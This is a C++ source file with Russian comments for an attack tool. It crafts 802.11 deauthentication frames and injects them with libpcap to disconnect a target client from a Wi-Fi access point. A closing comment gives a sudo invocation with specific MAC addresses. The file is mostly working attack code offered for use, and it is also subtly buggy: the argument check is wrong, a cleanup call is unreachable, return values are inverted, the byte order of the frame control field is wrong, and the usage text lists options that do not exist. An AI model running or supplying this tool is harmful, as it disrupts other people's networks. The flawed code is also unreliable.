#include <iostream>
#include <string>
#include <cstring>
#include <stdexcept>
#include <unistd.h>
#include <pcap/pcap.h>
#include <net/ethernet.h>
#include <netinet/if_ether.h>
#include <arpa/inet.h>
#include <linux/if_ether.h>
#include <net/if_arp.h>

// Определение структуры радиотап заголовка (упрощенное)
struct ieee80211_radiotap_header {
    uint8_t it_version;
    uint8_t it_pad;
    uint16_t it_len;
    uint32_t it_present;
};

// Структура для пакета деаутентификации
struct deauth_packet {
    struct ieee80211_radiotap_header radiotap_header;
    uint16_t frame_control;
    uint16_t duration;
    uint8_t receiver[6];
    uint8_t transmitter[6];
    uint8_t bssid[6];
    uint16_t seq_ctl;
    uint16_t reason_code;
};

// Функция для преобразования MAC-адреса из строки в массив байтов
void parse_mac(const std::string &mac_str, uint8_t *mac) {
    if (sscanf(mac_str.c_str(), "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx", 
               &mac[0], &mac[1], &mac[2], &mac[3], &mac[4], &mac[5]) != 6) {
        throw std::runtime_error("Неверный формат MAC-адреса");
    }
}

// Функция для отправки пакета деаутентификации
bool send_deauth(const std::string &interface, const std::string &ap_mac_str, 
                const std::string &client_mac_str) {
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t *handle = pcap_open_live(interface.c_str(), BUFSIZ, 1, 1000, errbuf);
    
    if (!handle) {
        throw std::runtime_error("Не удалось открыть интерфейс: " + std::string(errbuf));
    }

    uint8_t ap_mac[6];
    uint8_t client_mac[6];
    parse_mac(ap_mac_str, ap_mac);
    parse_mac(client_mac_str, client_mac);

    // Создаем пакет деаутентификации
    struct deauth_packet packet = {0};

    // Заполняем заголовок радиотапа
    packet.radiotap_header.it_version = 0;
    packet.radiotap_header.it_pad = 0;
    packet.radiotap_header.it_len = sizeof(struct ieee80211_radiotap_header);
    packet.radiotap_header.it_present = 0;

    // Заполняем заголовок 802.11
    packet.frame_control = htons(0x00C0); // Тип: управляющий, подтип: деаутентификация
    packet.duration = htons(314);
    memcpy(packet.receiver, client_mac, 6);
    memcpy(packet.transmitter, ap_mac, 6);
    memcpy(packet.bssid, ap_mac, 6);
    packet.seq_ctl = htons(0);
    packet.reason_code = htons(7); // Причина: класс 3 фрейм получен от неассоциированной станции


    if (pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(packet)) != 0) {
        return 1;
    } else {
        return 0;
    }

    pcap_close(handle);
}

int main(int argc, char *argv[]) {
    if (argc < 2) {
        std::cerr << "Использование: " << argv[0] << " <интерфейс> <MAC роутера> <MAC устройства> [количество] [задержка(мс)]" << std::endl;
        return 1;
    }

    try {
        std::string interface = argv[1];
        std::string ap_mac = argv[2];
        std::string client_mac = argv[3];

        std::cout << "Отправка пакетов деаутентификации:" << std::endl;
        std::cout << "Интерфейс: " << interface << std::endl;
        std::cout << "MAC роутера: " << ap_mac << std::endl;
        std::cout << "MAC устройства: " << client_mac << std::endl;

        send_deauth(interface, ap_mac, client_mac);


    } catch (const std::exception &e) {
        std::cerr << "Ошибка: " << e.what() << std::endl;
        return 1;
    }

    return 0;
}

// sudo ./deauth wlo1mon 34:CE:00:4B:08:3C 34:68:95:3A:C2:75 